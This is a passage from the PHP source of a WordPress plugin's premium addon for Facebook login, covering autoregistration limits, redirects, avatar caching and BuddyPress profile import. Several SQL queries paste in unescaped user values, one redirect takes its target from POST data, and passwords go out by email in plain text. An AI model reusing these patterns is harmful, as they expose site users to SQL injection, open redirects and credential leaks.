		return "<a href='$url' target='fb'>" . __('Visit', 'wp-fb-autoconnect')."</a>";
	//else if($uid)
    //	return "<a href='http://www.facebook.com/profile.php?id=$uid' target='fb'>ID $uid</a>";
	else
		return "";
}


/**********************************************************************/
/**********************************************************************/
/******************************LOGGING*********************************/
/**********************************************************************/
/**********************************************************************/


//Add a note to login logs that we're using the premium addon
function jfb_log_premium()
{
    global $jfb_log;
    $jfb_log .= "PREMIUM: Premium Addon Detected (#" . JFB_PREMIUM . ", Version: " . JFB_PREMIUM_VER . ")\n"; 
}

//Add an HTML comment that we're using the premium addon
function jfb_report_premium_version()
{
    echo "<!--Premium Add-On #" . JFB_PREMIUM . ", version " . JFB_PREMIUM_VER . "-->\n"; 
}


/**********************************************************************/
/**********************************************************************/
/***********************FEATURE IMPLEMENTATION*************************/
/**********************************************************************/
/**********************************************************************/


///////////////////////////////MultiSite Support////////////////////////////
////////////////////////////////////////////////////////////////////////////

/**
  * Add a blog_id variable to the login form, so we can pass it into _process_login.php
  */
function jfb_p_add_blogid()
{
    if(function_exists('is_multisite') && is_multisite())
    {
        global $blog_id;
        ?><input type="hidden" name="blog_id" id="blog_id" value="<?php echo $blog_id;?>" /><?php
    }
}

/**
  * When the login process begins, restore the blogid from the blog that initiated the login.
  */
function jfb_p_setup_blogid()
{
    if(function_exists('is_multisite') && is_multisite() && isset($_POST['blog_id']))
    {
        global $blog_id, $jfb_log;
        $jfb_log .= "PREMIUM: Restoring blogid " . $_POST['blog_id'] . " (from " . $blog_id . ")\n";
        switch_to_blog($_POST['blog_id']);
    }
}

/**
  * This function runs before process_login.php searches existing users for matching usermeta.  It searches
  * across all users of all blogs.
  */
function jfb_get_candidate_users($args)
{
    global $jfb_log, $wp_users, $wpdb, $jfb_uid_meta_name;
	$sql = "SELECT user_login,user_email,ID FROM {$wpdb->users} WHERE ID IN (SELECT user_id FROM {$wpdb->usermeta} WHERE `meta_key` = '$jfb_uid_meta_name' AND `meta_value` = '".$args['FB_ID']."')";
	$wp_users = $wpdb->get_results( $sql );
	$jfb_log .= "PREMIUM: Accessing users across all blogs in the network...\n";
}


/**
  * When we login, make sure to add the current user to the current blog
  * (aka autoregister existing users from this multisite install onto the current blog, which they may or may not already be a member of)
  */
function jfb_multisite_add_to_blog($args)
{
    global $blog_id, $jfb_log, $opt_jfbp_autoregistered_role;
	if( !is_user_member_of_blog($args['WP_ID']) )
	{
        $role = get_option($opt_jfbp_autoregistered_role);
        $jfb_log .= "PREMIUM: Added user to blog: \"" . get_blog_option($blog_id, 'blogname') . "\", Role: \"".$role."\"\n";
        add_existing_user_to_blog( array('user_id'=>$args['WP_ID'], 'role'=>$role) );
	}
    else
        $jfb_log .= "PREMIUM: User is already a member of blog \"" . get_blog_option($blog_id, 'blogname') . "\"\n";
}


////////////////////////////Custom Redirects////////////////////////////////
////////////////////////////////////////////////////////////////////////////

/**
  * Custom redirect for NEW (autoregistered) users 
  */
function jfb_redirect_newuser( $args )
{
    global $jfb_log, $redirectTo, $opt_jfbp_redirect_new_custom;
    $jfb_log .= "PREMIUM: Using custom redirect for autoregistered user: " . get_option($opt_jfbp_redirect_new_custom) . "\n";
    $redirectTo = str_replace("%username%", $args['WP_UserData']['user_login'], get_option($opt_jfbp_redirect_new_custom));
}

/**
  * Custom redirect for EXISTING users 
  */
function jfb_redirect_existinguser( $args )
{
    global $jfb_log, $redirectTo, $opt_jfbp_redirect_existing_custom;
    $jfb_log .= "PREMIUM: Using custom redirect for existing user: " . get_option($opt_jfbp_redirect_existing_custom) . "\n";
    $redirectTo = str_replace("%username%", $args['WP_UserData']->user_login, get_option($opt_jfbp_redirect_existing_custom));
}

/**
  * Custom redirect for LOGGING OUT users (uses the standard wordpress hook).
  */
function jfb_redirect_logout( $url )
{
    global $opt_jfbp_redirect_logout_custom;
    $url = remove_query_arg( 'redirect_to', $url );
    $url = add_query_arg('redirect_to', get_option($opt_jfbp_redirect_logout_custom), $url );
    return esc_url($url);
}

///////////////AutoRegistration Enable/Disable/Invitational/////////////////
////////////////////////////////////////////////////////////////////////////

/**
  * Autoregistration Option: Perform additional actions prior to inserting a new user 
  */
function jfb_registration_restrict($user_data, $args)
{
    global $jfb_log, $wpdb, $opt_jfbp_restrict_reg, $opt_jfbp_restrict_reg_url, $opt_jfbp_restrict_reg_uid, $opt_jfbp_restrict_reg_pid, $opt_jfbp_restrict_reg_gid;
    global $jfb_apiver;
    
    //Autoregistration DISABLED
    if( get_option($opt_jfbp_restrict_reg) == 1 )
    {
        $jfb_log .= "PREMIUM: Autoregistration is Disabled; redirecting to " . get_option($opt_jfbp_restrict_reg_url) . ".\n";
        header("Location: " . get_option($opt_jfbp_restrict_reg_url));
        j_mail("Facebook Login: Autoregistration Disabled");
        exit;
    }
    
    //Autoregistration INVITATIONAL
    else if( get_option($opt_jfbp_restrict_reg) == 2)
    {
        $result = $wpdb->get_results( "SELECT * FROM " . $wpdb->base_prefix . "invitations WHERE invited_email='" . $user_data['user_email'] . "'");
        if(is_array($result) && count($result) > 0)
            $jfb_log .= "PREMIUM: AutoRegistration Invitational: User " . $user_data['user_email'] . " has been invited; continuing login.\n";
        else
        {
            $jfb_log .= "PREMIUM: AutoRegistration Invitational: User " . $user_data['user_email'] . " not found in wp_invites; Redirecting to " . get_option($opt_jfbp_restrict_reg_url) . "\n";
            header("Location: " . get_option($opt_jfbp_restrict_reg_url));
            j_mail("Facebook Login: Autoregistration Invitational Denied");
            exit;
        }
    }
    
    //Autoregistration FRIENDSHIP
    else if( get_option($opt_jfbp_restrict_reg) == 3)
    {
        $my_uid = get_option($opt_jfbp_restrict_reg_uid);
        if( $my_uid == $args['FB_ID'])
            $areFriends = true;
        else
        {
            $friends = jfb_api_get("https://graph.facebook.com/$jfb_apiver/me/friends/".$my_uid."?access_token=".$args['access_token']);
            $areFriends = (count($friends['data']) > 0);
        }
        if( $areFriends ) 
        {
            $jfb_log .= "PREMIUM: Autoregistration by friendship accepted (visitor " . $args['FB_ID'] . " is friends with " . $my_uid . ")\n";
        }
        else
        {
            $jfb_log .= "PREMIUM: AutoRegistration by friendship denied  (visitor " . $args['FB_ID'] . " is NOT friends with " . $my_uid . ", or your app has not been approved for the user_friends permission.)\n";
            header("Location: " . get_option($opt_jfbp_restrict_reg_url));
            j_mail("Facebook Login: Autoregistration Friendship Denied");
            exit;
        }
    }
    
    //Autoregistation GROUP.
    //NOTE: This feature no longer works, thanks to Facebook crippling their API once again.  Leaving the code here temprarily
    //in hopes that I can eventually find a workaround, but the public-facing option has been removed from the admin panel...
    else if( get_option($opt_jfbp_restrict_reg) == 4)
    {
        $gid = get_option($opt_jfbp_restrict_reg_gid);
        $membersList = jfb_api_get("https://graph.facebook.com/$gid/members?access_token=".$args['access_token']);
        $membersList = $membersList['data'];
        function in_array_recursive($needle, $haystack)
        {
            foreach ($haystack as $item)
            {
                if ($item === $needle || (is_array($item) && in_array_recursive($needle, $item))) return true;
            }
            return false;
        }
        if( in_array_recursive($args['FB_ID'], $membersList) ) 
        {
            $jfb_log .= "PREMIUM: Autoregistration by membership accepted (visitor " . $args['FB_ID'] . " is member of group " . $gid . ")\n";
        }
        else
        {
            $jfb_log .= "PREMIUM: AutoRegistration by membership denied  (visitor " . $args['FB_ID'] . " is NOT member of group " . $gid . ")\n";
            header("Location: " . get_option($opt_jfbp_restrict_reg_url));
            j_mail("Facebook Login: Autoregistration Membership Denied");
            exit;
        }
    }
    
    //Autoregistation PAGE.  NOTE that this requires an extended permission (requested below).
    else if( get_option($opt_jfbp_restrict_reg) == 5)
    {
        $pg_id = get_option($opt_jfbp_restrict_reg_pid);
        $likes = jfb_api_get("https://graph.facebook.com/$jfb_apiver/me/likes/$pg_id?access_token=".$args['access_token']);
        if( count($likes['data']) > 0 ) 
        {
            $jfb_log .= "PREMIUM: Autoregistration by page accepted (visitor " . $args['FB_ID'] . " has liked page " . $pg_id . ")\n";
        }
        else
        {
            $jfb_log .= "PREMIUM: AutoRegistration by page denied  (visitor " . $args['FB_ID'] . " has NOT liked page " . $pg_id . ", or your app has not been approved for the user_likes permission.)\n";
            header("Location: " . get_option($opt_jfbp_restrict_reg_url));
            j_mail("Facebook Login: Autoregistration page Denied");
            exit;
        }
    }
    return $user_data;
}


/**
  * This is used to request extra permissions needed for some of the cases above. 
  */
function jfb_autoregister_extended_permissions($permissions)
{
    global $opt_jfbp_restrict_reg;
    if( get_option($opt_jfbp_restrict_reg) == 4)      $permissions .= ",user_groups";
    else if( get_option($opt_jfbp_restrict_reg) == 5) $permissions .= ",user_likes";
    else if(get_option($opt_jfbp_restrict_reg) == 3) $permissions .= ",user_friends";
    return $permissions;
}

///////////////////////////E-Mail Notification//////////////////////////////
////////////////////////////////////////////////////////////////////////////

/**
 * Send a custom notification message to newly connecting users
 */
function jfb_notify_newuser( $args )
{
    global $jfb_log, $opt_jfbp_notifyusers_subject, $opt_jfbp_notifyusers_content;
    $userdata = $args['WP_UserData'];
    $jfb_log .= "PREMIUM: Sending new registration notification to " . $userdata['user_email'] . ".\n";
    $mailContent = get_option($opt_jfbp_notifyusers_content);
    $mailContent = str_replace("%username%", $userdata['user_login'], $mailContent);
    $mailContent = str_replace("%password%", $userdata['user_pass'], $mailContent);
    wp_mail($userdata['user_email'], get_option($opt_jfbp_notifyusers_subject), $mailContent);
}


///////////////////////////Additional Buttons///////////////////////////////
////////////////////////////////////////////////////////////////////////////

/**
 * Add another Login with Facebook button below the comment form
 */
function jfb_show_comment_button()
{
    $userdata = wp_get_current_user();
    if( !$userdata->ID )
    {
        echo '<div id="facebook-btn-wrap">';
        jfb_output_facebook_btn();
        echo "</div>";
    }
}


/**
 * Add another Login with Facebook button to wp-signup.php (only relevant on WPMU installations)
 */
function jfb_show_signupform_btn()
{
    if( is_user_logged_in() ) return;
	if( get_site_option( 'registration' ) == "none" ) return;
	
	echo "<div class=\"fbLoginWrap\">";
	jfb_output_facebook_btn();
	//Since this is called 1st, the wp_footer callback will be skipped and this redirect will take precedence
	jfb_output_facebook_callback(get_bloginfo('url'));
	echo "</div>";
}
function jfb_add_signup_css()
{
    echo "<style type=\"text/css\">.fbLoginWrap{margin: 0 280px 5px 20px;text-align:center}</style>";
}


/**
 * Add another Login with Facebook button to wp-login.php (requires 4 separate filters).
 */
function jfb_show_loginform_btn_getredirect($arg)
{
    global $jfb_saved_redirect;
    $jfb_saved_redirect = $arg;
    return $arg;
}
function jfb_show_registerform_btn_getredirect($arg)
{
    global $jfb_saved_redirect;
    $jfb_saved_redirect = get_bloginfo('url');
    return $arg;    
}
function jfb_show_loginform_btn_initbtn()
{
    echo '<div id="facebook-btn-wrap">';
    jfb_output_facebook_btn();
    jfb_output_facebook_init(false);
    echo "</div>";
}
function jfb_show_loginform_btn_outputcallback( $arg )
{
    //Unfortunately, the login_form hook runs inside the <form></form> tags, so we can't use that to output our form.
    //Instead, I use login_message, which is run before the wp-login.php form.  If this isn't wp-login, stop executing.
    if( strpos($_SERVER['SCRIPT_FILENAME'], 'wp-login.php') === FALSE ) return $arg;
    
    //Output the form
    global $jfb_saved_redirect;
    jfb_output_facebook_callback($jfb_saved_redirect);
    return $arg;
}
function jfb_show_loginform_btn_styles()
{
    //Enqueue jQuery
    wp_enqueue_script('jquery');
    
    //Output CSS so our form isn't visible.
    echo '<style type="text/css" media="screen">
		#wp-fb-ac-fm { width: 0; height: 0; margin: 0; padding: 0; border: 0; }
		</style>';
}


//Add a login button to the BP registration page
function jfb_bpregistration_button()
{
    //We don't need to checked for logged-in status, because the registration page is only accessible while logged out.
    echo '<div id="facebook-btn-wrap">';
    jfb_output_facebook_btn();
    echo "</div><br />";
}

//////////////////////////Button Size & Text////////////////////////////////
////////////////////////////////////////////////////////////////////////////

/*
 * This function is called by jfb_output_facebook_btn() in the free plugin.
 * It references the premium options to let us customize the button from the admin panel.
 */ 
function jfb_output_facebook_btn_premium_30($scope)
{
    global $opt_jfbp_buttonstyle, $opt_jfbp_buttonimg, $jfb_js_callbackfunc, $opt_jfbp_buttonsize, $opt_jfbp_buttontext, $opt_jfbp_requirerealmail;
    
    //Original-style (xfbml) buttons
    if(get_option($opt_jfbp_buttonstyle) == 0)
    {
        $attr = "";
        if( get_option($opt_jfbp_buttonsize) == 1 )     $attr = 'size="small"';
        else if( get_option($opt_jfbp_buttonsize) == 2 )$attr = 'v="2" size="small"';
        else if( get_option($opt_jfbp_buttonsize) == 3 )$attr = 'v="2" size="medium"';
        else if( get_option($opt_jfbp_buttonsize) == 4 )$attr = 'v="2" size="large"';
        else if( get_option($opt_jfbp_buttonsize) == 5 )$attr = 'v="2" size="xlarge"';
		
		//For the "enforce access to e-mail" option
		if(get_option($opt_jfbp_requirerealmail)) $attr .= ' auth_type="rerequest"';
        
        ?><span class="fbLoginButton"><script type="text/javascript">//<!--
            document.write('<fb:login-button scope="<?php echo $scope;?>" <?php echo $attr;?> onlogin="<?php echo $jfb_js_callbackfunc;?>();"><?php echo get_option($opt_jfbp_buttontext);?></fb:login-button>');
        //--></script></span><?php
    }
        
    //New-style (image) buttons
    else
    {
    	$enforceEmailStr = (get_option($opt_jfbp_requirerealmail)?", auth_type:'rerequest'":"");
      ?><span class="fbLoginButton">
            <a class="wpfbac-button" href="javascript:void(0);" onClick="FB.login(function(resp){ if (resp.authResponse)<?php echo $jfb_js_callbackfunc?>(); }, {scope:'<?php echo $scope;?>'<?php echo $enforceEmailStr?>});"><img src="<?php echo get_option($opt_jfbp_buttonimg); ?>" alt="<?php echo $opt_jfbp_buttontext;?>" /></a>
        </span><?php
    }
}


/*
 * A stub, so in the unlikely event that someone tries to install this newer premium addon with pre-v3.0.0 free plugin,
 * the site frontend won't die.
 */
function jfb_output_facebook_btn_premium()
{
    return "";
}

  
/////////////////////////////Double-Logins//////////////////////////////////
////////////////////////////////////////////////////////////////////////////

/**
  * Double-logins happen if the reader opens two tabs, logs in with one, and logs in with the other;
  * the second page's nonce will be invalid, because the current user no longer matches the 'anonymous user'
  * who was used to generate the nonce.  If we detect someone trying to login while there's already
  * a user logged in, we'll assume this is the case and simply refresh the current page.
  * 
  * Exception: If the current login is an 'associate existing account with facebook' login, we can't just
  * refresh the page as we need to wait until we have a Facebook connection to get the uid and tag usermeta.
  * That's handled by another action, but this function must check for it to make sure we don't abort the
  * login process by refreshing the current page prematurely.
  */
function jfb_ignore_redundant_logins($args)
{
	//If this login is an 'associate existing account with facebook' login, don't treat this as a double-login;
	//just go back to _process_login, and the association will be handled later.
	if(isset($_POST['assoc_account'])) return;
	
    //If we're trying to login and a user is already logged-in, this is a "double login"
    $currUser = wp_get_current_user();
    if( !$currUser->ID ) return;
    
    //Get the redirect URL.  _wp_http_referer comes from the NONCE, not the user-specified redirect url.
    if( isset($_POST['_wp_http_referer']))
        $redirect = $_POST['_wp_http_referer'];
    else if( isset($_POST['redirectTo']))
        $redirect = $_POST['redirectTo'];
    else
        return;
 
    global $jfb_log;
    $jfb_log .= "PREMIUM: User \"$currUser->user_login\" has already logged in via another browser session.  Silently refreshing the current page.\n";
    j_mail("Facebook Double-Login: " . $currUser->user_login);
    header("Location: " . $redirect);
    exit;
}



/////////////////////////Enforce Email Permission///////////////////////////
////////////////////////////////////////////////////////////////////////////

/**
  * Require that the user has given us their e-mail address, by performing a secondary check prior to logging them in.
  * Note: If they say "no", getting Facebook to re-prompt them for the permission on subsequent logins requires adding 
  * auth_type="rerequest" to the login button.  There doesn't seem to be any issue with always including this (aside from 
  * the fact that it'll always reprompt for denied permissions), so that's what I do if this option is enabled.  
  * See my post here: http://stackoverflow.com/questions/27894504/downside-to-always-using-auth-type-rerequest-in-facebook-login-button-for-req
  * 
  * If it does become a problem, thoughts on how I might only 'rerequest' if they've *actually* denied their email:
  * -When they reject, use the WP AJAX api to write their FB UID to wp_options (i.e. an array of IDs of everyone who's 
  * explicitly denied).  ...But I have to put "reauth" on the buttons before pageload, not after the user clicks & I get their
  * ID (adding it with jquery DID NOT WORK). Aka on subsequent visits, I won't find out that it's the same FB ID until after
  * they've already tried to login again.  So I'll probably have to show a 2nd reauth prompt.  The user tries to login, we 
  * block them because their e-mail is hidden.  But in the callback from blocking them I'll have their id, so I show another 
  * login dialog, with the reauth param.  Don't forget to remove their uid from wp_options once they successfully login.   
  */
function jfb_enforce_real_email( $submitCode )
{
	global $opt_jfbp_email_rejected_msg, $opt_jfbp_email_notsetup, $opt_jfbp_email_notsetup_exception;
	ob_start(); ?>
	//PREMIUM CHECK: Force the user to allow access to their e-mail.
	//First, ask for the list of permissions (both approved + denied)
	FB.api('/me?fields=email,permissions', function(response)
	{
		//Make sure we got an array of permissions
		if(response.permissions.data instanceof Array)
		{
			var permsArray = response.permissions.data;
			for(var i = 0; i < permsArray.length; i++)
			{
				if(permsArray[i].permission == "email")
				{
                    //User approved e-mail permission, & we got their e-mail
					if(permsArray[i].status == "granted" && response.email)
					{
						<?php echo $submitCode;?>
						return;
					}
                    //User approved e-mail permission, but we didn't get their e-mail
                    //(because there's no e-mail address on their Facebook account at all)
					else if(permsArray[i].status == "granted" && response.email == null)
					{
                        <?php if(get_option($opt_jfbp_email_notsetup_exception)): ?>
                            <?php echo $submitCode;?>
						    return;
                        <?php else: ?>
						    <?php echo apply_filters('wpfb_login_rejected', '');?>
						    alert('<?php echo get_option($opt_jfbp_email_notsetup) ?>');
						    return;
                        <?php endif; ?>
					}
                    //User explicitly denied access to their e-mail
                    else
					{
                        <?php echo apply_filters('wpfb_login_rejected', '');?>
						alert('<?php echo get_option($opt_jfbp_email_rejected_msg) ?>');
						return;
					}
				}
			}
		}
	});
    <?php
    $output_string=ob_get_contents();
    ob_end_clean();
	return $output_string;
}


//////////////////////Avatar Caching & Dimensions///////////////////////////
////////////////////////////////////////////////////////////////////////////

/*
 * Get the path to where avatars are stored; used when both caching and deleting.
 */
function jfb_p_get_avatar_cache_dir()
{
    global $opt_jfbp_cache_avatar_dir, $opt_jfbp_cachedir_changetoblog;
    
    //Get the upload_dir setting from the specified blog
    $switchBlogs = function_exists('is_multisite') && is_multisite() && get_option($opt_jfbp_cachedir_changetoblog) != 0;
    if($switchBlogs) switch_to_blog(get_option($opt_jfbp_cachedir_changetoblog));
    $ud = wp_upload_dir();
    if($switchBlogs) restore_current_blog();
    
    //If the current page is ssl, change the url and baseurl to https
    if(is_ssl())
    {
        $ud['baseurl'] = str_replace("http://", "https://", $ud['baseurl']);
        $ud['url']     = str_replace("http://", "https://", $ud['url']);
    }
    
    //Get the subpath, and return an array formatted like that returned by wp_upload_dir
    $subpath = get_option($opt_jfbp_cache_avatar_dir);
    return array('basedir'=>trailingslashit($ud['basedir']),
                 'subdir'=>$subpath,
                 'path'=>trailingslashit($ud['basedir'] . "/" . $subpath),
                 'baseurl'=>$ud['baseurl'],
                 'url'=>trailingslashit($ud['basedir'] . "/" . $subpath));   
}

/*
 * Cache Facebook avatar thumbnails to the local server
 */
function jfb_cache_avatar_thumb( $args )
{
    //Get the path where we'll cache our avatars, and make sure it exists
    global $jfb_log;
    $path = jfb_p_get_avatar_cache_dir();
    @mkdir($path['path']);
    
    //Try to copy the thumbnail & update the meta
    $jfb_log .= "PREMIUM: Caching thumbnail avatar...";
    $srcFile = get_user_meta($args['WP_ID'], 'facebook_avatar_thumb', true);
    $dstFile = $path['path'] . $args['WP_ID'] . "_thumb.jpg";
    if( !@copy( $srcFile, $dstFile ) )
    {
        $errors= error_get_last();
        $jfb_log .= "ERROR copying thumbnail '" . print_r($srcFile, true) . "' to '$dstFile'.  Avatar caching aborted (Type: " . $errors['type'] . ", Message: " . $errors['message'] . ")\n";
        return;
    }
    update_user_meta($args['WP_ID'], 'facebook_avatar_thumb', trailingslashit($path['subdir']) . $args['WP_ID'] . '_thumb.jpg');
    $jfb_log .= "Cached to (" . $dstFile . ")\n";
}

/*
 * Cache fullsize Facebook avatars to the local server 
 */
function jfb_cache_avatar_full( $args )
{
	//Get the path where we'll cache our avatars, and make sure it exists
    global $jfb_log;
    $path = jfb_p_get_avatar_cache_dir();
    @mkdir($path['path']);
    
    //Try to copy the full image & update the meta
    $jfb_log .= "PREMIUM: Caching fullsize avatar...";
    $srcFile = get_user_meta($args['WP_ID'], 'facebook_avatar_full', true);
    $dstFile = $path['path'] . $args['WP_ID'] . "_full.jpg";
    if( !@copy( $srcFile, $dstFile ) )
    {
        $jfb_log .= "ERROR copying fullsize image '" . print_r($srcFile, true) . "' to '$dstFile'.  Avatar caching aborted.\n";
        return;
    }
    update_user_meta($args['WP_ID'], 'facebook_avatar_full', trailingslashit($path['subdir']) . $args['WP_ID'] . '_full.jpg');
    $jfb_log .= "Cached to (" . $dstFile . ")\n";
}

/*
 * When deleting a user, also try to delete their cached avatars
 */
function jfb_delete_cached_avatar($id)
{
    //Get the path to the avatars
    $path = jfb_p_get_avatar_cache_dir(); 
    
    //Try to delete the thumbnail, if present
    $thumbFile = $path['basedir'] . get_user_meta($id, 'facebook_avatar_thumb', true);
    if( file_exists ( $thumbFile ))
        @unlink($thumbFile);
        
    //Try to delete the full image, if present
    $fullFile = $path['basedir'] . get_user_meta($id, 'facebook_avatar_full', true);
    if( file_exists ( $fullFile ))
        @unlink($fullFile);
}


/*
 * Specify avatar dimensions
 */
function jfb_avatar_dimensions($query, $type)
{
	global $opt_jfbp_avatar_full_dimensions_w, $opt_jfbp_avatar_full_dimensions_h;
	if($type == "thumb") 		return $query;
	else if($type == "full")	return "width=".get_option($opt_jfbp_avatar_full_dimensions_w)."&height=".get_option($opt_jfbp_avatar_full_dimensions_h);
}

/////////////////////////////AJAX Spinner//////////////////////////////////
////////////////////////////////////////////////////////////////////////////

/**
 * When the user begins a login (after clicking "Login" in the Facebook popup), hide the button and show a spinner
 * NOTE: For this to work in wp-login.php, I have to include jQuery myself!  Done with a filter below.
 */
function jfb_button_to_spinner()
{
    echo "      jQuery('.fbLoginButton').hide();\n";
    echo "      jQuery('.login_spinner').show();\n";
}

/**
 * If the login fails (i.e. if they refused to reveal their email address), turn it back to a button 
 */
function jfb_spinner_to_button()
{
    return "      jQuery('.login_spinner').hide();\n" .
           "      jQuery('.fbLoginButton').show();\n";
}

/**
 * Insert the spinner HTML (initially hidden) just after the Login with Facebook button
 */
function jfb_output_spinner()
{
    global $opt_jfbp_show_spinner, $jfb_data_url;
    if( get_option($opt_jfbp_show_spinner) == 1 )
        echo "<div class=\"login_spinner\" style=\"display:none; margin-top:7px; text-align:center;\" ><img src=\"" . $jfb_data_url . "/assets/spinner_white.gif\" alt=\"Please Wait...\" /></div>";
    else
        echo "<div class=\"login_spinner\" style=\"display:none; margin-top:7px; text-align:center;\" ><img src=\"" . $jfb_data_url . "/assets/spinner_black.gif\" alt=\"Please Wait...\" /></div>";
}


////////////////////////Localize Facebook Popups////////////////////////////
////////////////////////////////////////////////////////////////////////////
function jfb_output_fb_locale($locale)
{ 
    global $opt_jfbp_localize_facebook;
    if( get_option($opt_jfbp_localize_facebook) && defined('WPLANG') && WPLANG != '' )
        return WPLANG;
    return $locale;
}


///////////////////////Wordbooker Avatar Integration////////////////////////
////////////////////////////////////////////////////////////////////////////
function jfb_wordbooker_avatar($avatar, $id_or_email, $size, $default, $alt)
{
    //If this comment was imported by wordbook, and Wordbook stored the uid of the Facbook user who posted it,
    //And that user has logged into this blog with wp-fb-autoconnect before, use that user's avatar.
    global $wpdb, $comment, $jfb_uid_meta_name;
    if( is_object($comment) && is_numeric($comment->comment_ID) )
    {
        //See if this comment has a Facebook UID (from Wordbooker).
        $fb_uid = get_comment_meta($comment->comment_ID, 'fb_uid', true);
        if( !is_numeric($fb_uid) ) return $avatar;
        
        //It does!  See if we have any users with this Facebook UID (from WP-FB-AutoConnect)
        $usermeta = $wpdb->prefix . 'usermeta';
        $users = $wpdb->prefix . 'users';
        $select_user = "SELECT user_id FROM $usermeta,$users " .
        			   "WHERE $usermeta.meta_key = '$jfb_uid_meta_name' ".
                       "AND $usermeta.meta_value = '$fb_uid' ".
                       "AND $usermeta.user_id = $users.ID";
        $wp_uid = $wpdb->get_var($select_user);
        if( !is_numeric($wp_uid) ) return $avatar;
        
        //We do!  Re-run jfb_wp_avatar() (in the main plugin), this time overriding $id_or_email.
        return jfb_wp_avatar($avatar, $wp_uid, $size, $default, $alt);
    }
    
    //Should't get here, but just to be safe...
    return $avatar;
}


//////////////////BuddyPress Activity Stream Announcement///////////////////
////////////////////////////////////////////////////////////////////////////

/*
 * When a new or returning user logs into the site, announce it to the BuddyPress activity stream.
 * Note: The BP core functions available for posting activities are:
 * bp_activity_add()          - The most generic/low-level function for posting activities of any kind; all of the following are wrappers around this.
 * bp_activity_post_update()  - Posts activities exclusively of the form "<user> posted an update." Not customizable at all, not what we need.
 * bp_blogs_record_activity() - Lets you specify an activity type; internally used for things like "xx wrote a new post" and "xx commented on the post."
 *                              Performs just a few checks before running bp_activity_add(), such as updating an existing entry if one already exists.
 */
function jfb_notify_bp_activitystream_existing($args)
{
	global $jfb_log, $opt_jfbp_bpstream_logincontent;
	$jfb_log .= "PREMIUM: Announcing the returning user's login on the BP Activity Stream\n";
	jfb_notify_bp_activitystream($args['WP_ID'], get_option($opt_jfbp_bpstream_logincontent), 'facebook');
}
function jfb_notify_bp_activitystream_registering($args)
{
	global $jfb_log, $opt_jfbp_bpstream_registercontent;
	$jfb_log .= "PREMIUM: Announcing the new registration on the BP Activity Stream\n";
	jfb_notify_bp_activitystream($args['WP_ID'], get_option($opt_jfbp_bpstream_registercontent), 'facebook');
}
function jfb_notify_bp_activitystream($ID, $announcement, $type)
{
	//Make sure BP is active and we have an announcement
	global $bp, $jfb_log;
	if( !function_exists('bp_activity_add') )
	{
		$jfb_log .= "PREMIUM: WARNING - BuddyPress not detected; skipping activity stream announcement.\n";
		return;
	}
	if( $announcement == "" )
	{
		$jfb_log .= "PREMIUM: WARNING - No message is specified; skipping activity stream announcement.\n";
		return;		
	}
	
	//Make the announcement!
	$activity_args = array(
		'user_id'  => $ID,
		'action'   => str_replace("%user%", bp_core_get_userlink($ID), $announcement),
		'content'  => "",
		'type'     => $type,
		'component'=> $bp->activity->id );
	bp_activity_add( $activity_args );
}


////////////////////////BuddyPress XProfile Mapping/////////////////////////
////////////////////////////////////////////////////////////////////////////
/**
 * To add support for additional Facebook fields (https://developers.facebook.com/docs/reference/api/user):
 * 1) Add it to the list of $allowed_mappings in jfb_output_premium_panel()
 * 2) Add it to the list of $fields_requiring_perms in jfb_xprofile_extended_permissions() (if necessary)
 * 3) Add a case to jfb_import_to_xprofile() (to process it from i.e. an array/object into a single string for writing to the xProfile)
 */

/**
  * When a user logs in, this function can fetch additional information from Facebook
  * and insert it in their Buddypress XProfile.
  */
function jfb_import_to_xprofile($args)
{
    //Make sure BuddyPress is installed.
    if( !function_exists('xprofile_set_field_data') ) return;
    
    //Get our mappings from the database, and make sure they're valid
    global $jfb_log, $opt_jfbp_xprofile_mappings, $jfb_apiver;
    $current_mappings = get_option($opt_jfbp_xprofile_mappings);
    if(!is_array($current_mappings))
    {
        $jfb_log .= "WARNING: BuddyPress XProfile options are not an array!  Fields will not be imported.\n";
        return;
    }
    
    //Get a list of the unique Facebook fields we'll need to access (and make sure there actually are some)
    $jfb_log .= "PREMIUM: Checking for XProfile mappings...";
    $fbFields = array_diff(array_unique($current_mappings), array("0"));
	$fbFields = apply_filters('wpfb_xprofile_fields_to_query', $fbFields);
    if(count($fbFields) == 0)
    {
        $jfb_log .= "No mappings found!\n";
        return;
    }
    $jfb_log .= "Found " . count($fbFields) . " unique mappings\n";
    
    //Query Facebook for the fields
    $fbFields = implode(",", $fbFields);
    $jfb_log .= "PREMIUM: Querying Facebook for \"" . $fbFields . "\"...\n";
    try
    {
        $fbuser = jfb_api_get("https://graph.facebook.com/$jfb_apiver/me?fields=$fbFields"."&access_token=".$args['access_token']);
    }
    catch(Exception $e)
    {
        $jfb_log .= "WARNING: The Facebook API returned an exception!  Field mapping will abort. ($e)\n";
        return;
    }
	if(isset($fbuser['error']))
	{
		$jfb_log .= "WARNING: The Facebook API returned an exception!  Field mapping will abort. Message: " . $fbuser['error']['message'] . "\n";
        return;
	}
    
    //Some fields require "special" processing (i.e. those that come in the format of an array/object; flatten them to a basic string.
    if(isset($fbuser['location']) && is_array($fbuser['location']))   $fbuser['location'] = $fbuser['location']['name'];
    if(isset($fbuser['hometown']) && is_array($fbuser['hometown']))   $fbuser['hometown'] = $fbuser['hometown']['name'];
    if(isset($fbuser['languages']) && is_array($fbuser['languages']))
    {
        $langs = array();
        foreach($fbuser['languages'] as $lang) array_push($langs, $lang['name']);
        $fbuser['languages'] = implode(",", $langs);
    }	
	if(isset($fbuser['music']) && is_array($fbuser['music']) && is_array($fbuser['music']['data']))
    {
        $arr = array();
        foreach($fbuser['music']['data'] as $item) array_push($arr, $item['name']);
        $fbuser['music'] = implode(",", $arr);
    }
    //Birthday comes as mm/dd/yyyy (ref: https://developers.facebook.com/docs/graph-api/reference/user/)
    //BP's validation_regex requires it to match: ^\d{4}-\d{1,2}-\d{1,2} 00:00:00$
    if(isset($fbuser['birthday']))
    {
        //If the user's privacy settings has limited birthday info to just "yyyy" or "mm/dd" (vs the full mm/dd/yyyy),
        //skip mapping this field to XProfile (BP requires that we set the FULL birthday)
        if(1 != preg_match( "/^\d{2}\/\d{2}\/\d{4}$/", $fbuser['birthday'] ))
        {
            $jfb_log .= "PREMIUM: The user's Facebook profile contained incomplete information for 'Birthday' (probably due to privacy settings).  It will not be copied to BP XProfile.\n";
            unset($fbuser['birthday']);
        }
        else
            $fbuser['birthday'] = date("Y-m-d H:i:s", strtotime($fbuser['birthday']));
    }
	
	//A filter so 3rd party plugins can process any extra fields they might need
	$fbuser = apply_filters('wpfb_xprofile_fields_received', $fbuser, $args['WP_ID']);
    
